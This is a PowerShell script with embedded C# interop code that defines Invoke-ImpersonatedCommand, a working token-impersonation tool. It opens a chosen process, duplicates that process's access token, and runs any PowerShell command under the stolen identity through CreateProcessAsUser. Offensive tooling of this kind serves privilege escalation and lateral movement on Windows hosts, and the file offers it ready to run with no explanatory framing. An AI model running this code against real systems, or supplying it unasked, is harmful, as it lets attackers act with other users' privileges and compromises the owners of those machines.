Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
"@

function Invoke-ImpersonatedCommand {
    param (
        [Parameter(Mandatory = $true)]
        [int]$TargetPid,

        [Parameter(Mandatory = $true)]
        [string]$Command
    )

    # Access rights
    $PROCESS_QUERY_INFORMATION = 0x0400
    $TOKEN_DUPLICATE = 0x0002
    $TOKEN_QUERY = 0x0008
    $MAXIMUM_ALLOWED = 0x02000000
    $CREATE_NEW_CONSOLE = 0x00000010

    $TokenPrimary = 1
    $SecurityImpersonation = 2

    $si = New-Object NativeMethods+STARTUPINFO
    $pi = New-Object NativeMethods+PROCESS_INFORMATION
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)

    $hProcess = [NativeMethods]::OpenProcess($PROCESS_QUERY_INFORMATION, $false, [uint32]$TargetPid)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Error "[-] Failed to open process. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    $hToken = [IntPtr]::Zero
    if (-not [NativeMethods]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_QUERY, [ref]$hToken)) {
        Write-Error "[-] Failed to open process token. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    $hDupToken = [IntPtr]::Zero
    if (-not [NativeMethods]::DuplicateTokenEx($hToken, $MAXIMUM_ALLOWED, [IntPtr]::Zero, $SecurityImpersonation, $TokenPrimary, [ref]$hDupToken)) {
        Write-Error "[-] Failed to duplicate token. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hToken) | Out-Null
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    # Set the executable to powershell.exe and pass the dynamic command as arguments
    $executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $arguments = "-Command `"$Command`""

    if (-not [NativeMethods]::CreateProcessAsUser(
        $hDupToken,
        $executable,  # lpApplicationName
        $arguments,   # lpCommandLine
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        $false,
        $CREATE_NEW_CONSOLE,
        [IntPtr]::Zero,
        "C:\Users\Public",  # Set a valid working directory
        [ref]$si,
        [ref]$pi)) {
        Write-Error "[-] CreateProcessAsUser failed. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()). Command: $executable $arguments"
        [NativeMethods]::CloseHandle($hDupToken) | Out-Null
        [NativeMethods]::CloseHandle($hToken) | Out-Null
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    Write-Host "[+] Process launched as user from TargetPid {$TargetPid}: $executable $arguments"

    # Close handles
    [NativeMethods]::CloseHandle($hToken) | Out-Null
    [NativeMethods]::CloseHandle($hDupToken) | Out-Null
    [NativeMethods]::CloseHandle($hProcess) | Out-Null
    [NativeMethods]::CloseHandle($pi.hThread) | Out-Null
    [NativeMethods]::CloseHandle($pi.hProcess) | Out-Null
}
